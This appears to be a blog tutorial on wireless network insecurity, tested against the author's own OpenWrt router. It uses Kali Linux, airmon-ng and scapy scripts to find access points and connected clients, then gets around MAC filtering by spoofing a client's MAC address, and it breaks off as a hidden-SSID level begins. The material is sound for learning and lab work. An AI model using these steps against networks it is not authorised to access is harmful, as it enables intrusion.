---
layout: default
title: articles/wireless-insecurity
category: pages
---

### init() ###

  * VMWare Player + KALI Linux
  * TP-WN822N (USB wireless card)
  * GT-I9000 (Samsung Galaxy S)
  * TP-WR710N (wireless router)

There are tools (Kismet, in particular) which will show you available networks, unmask SSIDs and show you connected clients. But where's the fun in that?

FYI you might need to get the vmware tools installed if you want things like clipboard integration. Do an `apt-get update` followed by `apt-get install open-wm-toolbox` and `vmware-...`.

Boot up KALI. Open a terminal and make sure your wireless adapter has been recognised:

    root@kali:~# iwconfig wlan0
    wlan0     IEEE 802.11bgn  ESSID:off/any  
              Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
              Retry  long limit:7   RTS thr:off   Fragment thr:off
              Encryption key:off
              Power Management:off

Put it in monitor mode (note we shut the interface down first - as it's already up):

    root@kali:~# ifconfig wlan0 down
    root@kali:~# iwconfig wlan0 mode monitor
    root@kali:~# ifconfig wlan0 up
    root@kali:~# iwconfig wlan0
    wlan0     IEEE 802.11bgn  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm   
              Retry  long limit:7   RTS thr:off   Fragment thr:off
              Power Management:off

KALI already has the `scapy` module installed, so we're ready to go.

### Scanning for SSIDs ###

Small confession. I happen to know my router is using channel 8, which can be set as such: `iwconfig wlan0 channel 8`. See, by putting the card in monitor mode ourselves, it only listens to the default channel, and won't hop. There is a simple workaround for this, and it's to use airdump-ng. This creates a new monitor interface (usually `mon0`) which does channel-hopping for us. So let's do that now.

    root@kali:~# airmon-ng start wlan0
    ...
    Interface Chipset   Driver
    
    wlan0   Atheros AR9287  ath9k - [phy0]
            (monitor mode enabled on mon0)
    
    root@kali:~# iwconfig mon0
    mon0      IEEE 802.11bgn  Mode:Monitor  Frequency:2.447 GHz  Tx-Power=20 dBm   
              Retry  long limit:7   RTS thr:off   Fragment thr:off
              Power Management:off

APs send out beacon frames. If the SSID isn't hidden, `scapy` will populate the `info` field on the Dot11 layer.

{% highlight python %}
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11
import logging
import sys
# default logging config to log info out to stdout
logging.basicConfig(level=logging.INFO, handlers=[logging.StreamHandler(sys.stdout)])

APs = []
def processPacket(pkt):
    if pkt.haslayer(Dot11Beacon):
        lyr = pkt.getlayer(Dot11)
        if lyr.addr2 not in APs:
            logging.info('AP found  (SSID %s, MAC %s)' % (lyr.info, lyr.addr2))
            APs.append(lyr.addr2)

conf.iface = 'mon0'
sniff(prn=processPacket)
{% endhighlight %}

Save the above in a file called `monitory.py` and run:

    root@kali:~# python monitor.py 2>&1 | grep OpenWrt
    INFO:root:AP found  (SSID OpenWrt, MAC 10:fe:ed:61:fa:e8)

### Level 0x0: MAC Filtering ###

That's not even really considered a security feature, more of an annoyance really.

For now let's assume we know the SSID of the access point we're trying to achieve (we'll try without later). We want to list all the clients attached to this AP.

{% highlight python %}
from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeReq, Dot11
import logging
import sys
# default logging config to log info out to stdout
logging.basicConfig(level=logging.INFO, handlers=[logging.StreamHandler(sys.stdout)])

clients = []
def processPacket(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        lyr = pkt.getlayer(Dot11)
        if lyr.addr2 not in clients :
            logging.info('Probe request from %s for %s' % (lyr.info, lyr.addr2))
            clients.append(lyr.addr2)

conf.iface = 'mon0'
sniff(prn=processPacket)
{% endhighlight %}

And sure enough:

    INFO:root:Probe request from OpenWrt for 00:26:37:97:9a:7e

So now we have the MAC address for one of the client. Let's change ours:

    root@kali:~# ifconfig wlan0 down
    root@kali:~# ifconfig wlan0 hw ether 00:26:37:97:9a:7e
    root@kali:~# ifconfig wlan0 up

And sure enough, we can now connect to the network!

    root@kali:~# ifconfig wlan0
    wlan0     Link encap:Ethernet  HWaddr 00:26:37:97:9a:7e  
              inet addr:192.168.1.188  Bcast:192.168.1.255  Mask:255.255.255.0

Beauty is on the router's side there's still only once client connected:

    root@OpenWrt:~# iwinfo wlan0 assoclist
    00:26:37:97:9A:7E  -65 dBm / -95 dBm (SNR 30)  200 ms ago
    RX: 58.5 MBit/s, MCS 6, 20MHz                     91 Pkts.
    TX: 43.3 MBit/s, MCS 4, 20MHz, short GI           43 Pkts.


### Level 0x1 ###

Let's step things up a very small notch by hiding the SSID on the router.

    root@OpenWrt:~# uci set wireless.@wifi-iface[0].hidden=1
    root@OpenWrt:~# uci commit
    root@OpenWrt:~# uci show wireless
    ...
    wireless.@wifi-iface[0].hidden=1


